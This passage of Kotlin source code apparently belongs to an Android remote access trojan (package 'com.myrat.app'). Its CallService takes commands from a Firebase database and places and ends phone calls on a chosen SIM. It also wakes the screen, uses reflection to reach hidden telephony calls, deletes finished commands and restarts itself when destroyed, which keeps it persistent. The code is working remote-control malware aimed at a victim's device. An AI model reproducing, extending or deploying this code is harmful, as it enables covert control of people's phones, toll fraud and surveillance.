                val displayName = try { info.displayName?.toString()?.lowercase() ?: "" } catch (e: Exception) { "" }
                val carrierName = try { info.carrierName?.toString()?.lowercase() ?: "" } catch (e: Exception) { "" }

                Logger.log("Checking SIM: slot=$simSlotIndex, number=$phoneNumber, displayName=$displayName, carrierName=$carrierName")

                normalizedSimNumber == "sim${simSlotIndex + 1}" ||
                        normalizedSimNumber == phoneNumber ||
                        displayName.contains(normalizedSimNumber) ||
                        carrierName.contains(normalizedSimNumber) ||
                        (normalizedSimNumber == "sim1" && simSlotIndex == 0) ||
                        (normalizedSimNumber == "sim2" && simSlotIndex == 1)
            }

            if (subscriptionInfo == null) {
                Logger.error("No SIM found for simNumber: $simNumber. Available SIMs: ${subscriptionInfoList.map { "sim${it.simSlotIndex + 1}:${try { it.number } catch (e: Exception) { "unknown" }}:${try { it.displayName } catch (e: Exception) { "unknown" }}" }}")
                updateCommandStatus(commandId, "failed", "No SIM found for: $simNumber")
                return false
            }

            val subId = subscriptionInfo.subscriptionId
            val simSlotIndex = subscriptionInfo.simSlotIndex
            Logger.log("✅ Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")

            // Update status to indicate call is being initiated
            updateCallStatus("dialing", recipient, commandId, null)

            val success = makeCallWithEnhancedMethods(recipient, subId, simSlotIndex, commandId)

            if (success) {
                alreadySentSet.add(recipient)
                Logger.log("✅ Successfully initiated call from $simNumber (subId: $subId) to $recipient")
            } else {
                updateCommandStatus(commandId, "failed", "Call initiation failed")
                updateCallStatus("idle", null, null, null)
                Logger.error("❌ Failed to initiate call from $simNumber to $recipient")
            }

            return success

        } catch (e: SecurityException) {
            Logger.error("Permission denied for call to $recipient", e)
            updateCommandStatus(commandId, "failed", "Permission denied: ${e.message}")
            updateCallStatus("idle", null, null, null)
            return false
        } catch (e: Exception) {
            Logger.error("Failed to initiate call to $recipient", e)
            updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
            updateCallStatus("idle", null, null, null)
            return false
        }
    }

    private fun initiateCallWithSimSelection(simNumber: String, recipient: String, commandId: String): Boolean {
        return initiateCallWithEnhancedMonitoring(simNumber, recipient, commandId)
    }

    private fun makeCallWithEnhancedMethods(recipient: String, subId: Int, simSlotIndex: Int, commandId: String): Boolean {
        return try {
            wakeUpScreen()

            // Method 1: Enhanced TelecomManager approach
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && telecomManager != null) {
                try {
                    val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager!!, subId)

                    if (phoneAccountHandle != null) {
                        val uri = android.net.Uri.parse("tel:$recipient")
                        val extras = Bundle().apply {
                            putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
                            putInt("android.telephony.extra.SUBSCRIPTION_ID", subId)
                            putInt("com.android.phone.extra.slot", simSlotIndex)
                            putInt("subscription", subId)
                            putBoolean(TelecomManager.EXTRA_START_CALL_WITH_SPEAKERPHONE, false)
                            putString("EXTRA_CALL_COMMAND_ID", commandId)
                        }

                        telecomManager!!.placeCall(uri, extras)
                        Logger.log("📞 Enhanced call placed using TelecomManager with subId: $subId")

                        startCallMonitoring(commandId, recipient)
                        return true
                    } else {
                        Logger.error("No valid PhoneAccountHandle found for subId: $subId")
                    }
                } catch (e: SecurityException) {
                    Logger.error("SecurityException in TelecomManager call", e)
                } catch (e: Exception) {
                    Logger.error("TelecomManager call failed, trying fallback", e)
                }
            }

            // Method 2: Enhanced Intent approach
            try {
                val intent = Intent(Intent.ACTION_CALL).apply {
                    data = android.net.Uri.parse("tel:$recipient")
                    putExtra("com.android.phone.force.slot", true)
                    putExtra("com.android.phone.extra.slot", simSlotIndex)
                    putExtra("android.telephony.extra.SUBSCRIPTION_ID", subId)
                    putExtra("subscription", subId)
                    putExtra("EXTRA_CALL_COMMAND_ID", commandId)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }

                startActivity(intent)
                Logger.log("📞 Enhanced fallback call initiated using ACTION_CALL with subId: $subId")

                startCallMonitoring(commandId, recipient)
                return true
            } catch (e: ActivityNotFoundException) {
                Logger.error("No activity found to handle ACTION_CALL", e)
            } catch (e: SecurityException) {
                Logger.error("SecurityException in ACTION_CALL", e)
            }

            // Method 3: LauncherActivity fallback
            try {
                val intent = Intent(this, LauncherActivity::class.java).apply {
                    action = "com.myrat.app.ACTION_MAKE_CALL"
                    putExtra("recipient", recipient)
                    putExtra("subId", subId)
                    putExtra("simSlotIndex", simSlotIndex)
                    putExtra("commandId", commandId)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }

                startActivity(intent)
                Logger.log("📞 Enhanced fallback call initiated via LauncherActivity with subId: $subId")

                startCallMonitoring(commandId, recipient)
                return true
            } catch (e: Exception) {
                Logger.error("LauncherActivity fallback failed", e)
            }

            Logger.error("All enhanced call methods failed for $recipient")
            return false

        } catch (e: Exception) {
            Logger.error("Unexpected error in makeCallWithEnhancedMethods", e)
            return false
        }
    }

    private fun startCallMonitoring(commandId: String, recipient: String) {
        try {
            Logger.log("Starting enhanced call monitoring for command: $commandId, recipient: $recipient")

            handler.postDelayed({
                try {
                    val currentState = telephonyManager?.callState ?: TelephonyManager.CALL_STATE_IDLE
                    val isInCall = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && telecomManager != null) {
                        telecomManager!!.isInCall
                    } else {
                        currentState != TelephonyManager.CALL_STATE_IDLE
                    }

                    Logger.log("Call monitoring check - State: $currentState, isInCall: $isInCall")

                    if (isInCall || currentState != TelephonyManager.CALL_STATE_IDLE) {
                        if (!isCallActive) {
                            Logger.log("Call monitoring detected active call, updating status")
                            handleCallStateChange(TelephonyManager.CALL_STATE_OFFHOOK, recipient, "CallMonitoring")
                        }
                    }
                } catch (e: Exception) {
                    Logger.error("Error in call monitoring check", e)
                }
            }, 3000)
        } catch (e: Exception) {
            Logger.error("Error starting call monitoring", e)
        }
    }

    private fun endCallWithMultipleMethods(commandId: String) {
        try {
            Logger.log("Attempting to end call using multiple methods for command: $commandId")

            var callEnded = false

            // Method 1: TelecomManager (Android 9+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && telecomManager != null) {
                try {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
                        telecomManager!!.endCall()
                        Logger.log("Call ended via TelecomManager for command $commandId")
                        callEnded = true
                    }
                } catch (e: Exception) {
                    Logger.error("TelecomManager endCall failed", e)
                }
            }

            // Method 2: Reflection method (fallback)
            if (!callEnded) {
                callEnded = tryReflectionEndCall(commandId)
            }

            // Method 3: Force state update if other methods fail
            if (!callEnded) {
                Logger.log("Forcing call end status update for command: $commandId")
                handleCallStateChange(TelephonyManager.CALL_STATE_IDLE, null, "ForceEnd")
                callEnded = true
            }

            if (callEnded) {
                updateCommandStatus(commandId, "cancelled", null)
            } else {
                updateCommandStatus(commandId, "failed", "Unable to end call")
            }

        } catch (e: Exception) {
            Logger.error("Failed to end call with multiple methods", e)
            updateCommandStatus(commandId, "failed", "End call error: ${e.message}")
        }
    }

    private fun tryReflectionEndCall(commandId: String): Boolean {
        return try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            if (telephonyManager == null) {
                Logger.error("TelephonyManager unavailable for reflection end call")
                return false
            }

            val methods = listOf("endCall", "endCallForSubscriber")

            for (methodName in methods) {
                try {
                    val telephonyClass = Class.forName(telephonyManager.javaClass.name)
                    val getITelephonyMethod = telephonyClass.getDeclaredMethod("getITelephony")
                    getITelephonyMethod.isAccessible = true
                    val iTelephony = getITelephonyMethod.invoke(telephonyManager)

                    if (iTelephony != null) {
                        val iTelephonyClass = Class.forName(iTelephony.javaClass.name)
                        val endCallMethod = iTelephonyClass.getDeclaredMethod(methodName)
                        endCallMethod.isAccessible = true
                        val result = endCallMethod.invoke(iTelephony) as? Boolean

                        if (result == true) {
                            Logger.log("Call ended via reflection method: $methodName")
                            return true
                        }
                    }
                } catch (e: Exception) {
                    Logger.log("Reflection method $methodName failed: ${e.message}")
                }
            }

            false
        } catch (e: Exception) {
            Logger.error("Reflection end call failed completely", e)
            false
        }
    }

    private fun getPhoneAccountHandleForSubscription(telecomManager: TelecomManager, subId: Int): PhoneAccountHandle? {
        return try {
            val phoneAccounts = telecomManager.callCapablePhoneAccounts
            Logger.log("Available phone accounts: ${phoneAccounts.size}")

            phoneAccounts.find { account ->
                try {
                    val phoneAccount = telecomManager.getPhoneAccount(account)
                    val accountSubId = phoneAccount?.extras?.getInt("android.telephony.extra.SUBSCRIPTION_ID", -1) ?: -1
                    Logger.log("Checking account: $account, subId: $accountSubId vs target: $subId")
                    accountSubId == subId
                } catch (e: Exception) {
                    Logger.error("Error checking phone account: $account", e)
                    false
                }
            }
        } catch (e: Exception) {
            Logger.error("Error getting PhoneAccountHandle for subId: $subId", e)
            null
        }
    }

    private fun wakeUpScreen() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (powerManager != null && !powerManager.isInteractive) {
                val screenWakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                    "CallService:ScreenWake"
                )
                screenWakeLock.acquire(10000)
                screenWakeLock.release()
                Logger.log("Screen woken up for call")
            }
        } catch (e: Exception) {
            Logger.error("Failed to wake up screen for call", e)
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        try {
            if (commandId.isEmpty()) {
                Logger.error("Empty commandId, skipping status update")
                return
            }

            val commandRef = Firebase.database.getReference("Device/$deviceId/call_commands/$commandId")
            val updates = mutableMapOf<String, Any?>(
                "status" to status,
                "timestamp" to System.currentTimeMillis(),
                "enhanced_service" to true
            )
            if (error != null) {
                updates["error"] = error
            }

            commandRef.updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("Updated call command $commandId to status $status")
                    if (status in listOf("success", "failed", "completed", "cancelled")) {
                        handler.postDelayed({
                            commandRef.removeValue()
                                .addOnSuccessListener {
                                    Logger.log("Removed call command $commandId")
                                    sentCallTracker.remove(commandId)

                                    if (currentCallCommandId == commandId) {
                                        currentCallCommandId = null
                                    }
                                }
                                .addOnFailureListener { e ->
                                    Logger.error("Failed to remove command", e)
                                }
                        }, 2000)
                    }
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update call command $commandId", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating call command status", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            restartRunnable?.let { restartHandler.removeCallbacks(it) }

            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)

            updateCallStatus("idle", null, null, null)

            isCallActive = false
            currentCallCommandId = null
            currentCallNumber = null
            callStartTime = 0
            lastCallState = TelephonyManager.CALL_STATE_IDLE
            currentCall = null

            Logger.log("Enhanced CallService destroyed - restarting immediately")

            val intent = Intent(this, CallService::class.java)
            startService(intent)

        } catch (e: Exception) {
            Logger.error("Error destroying CallService", e)
        }
    }
}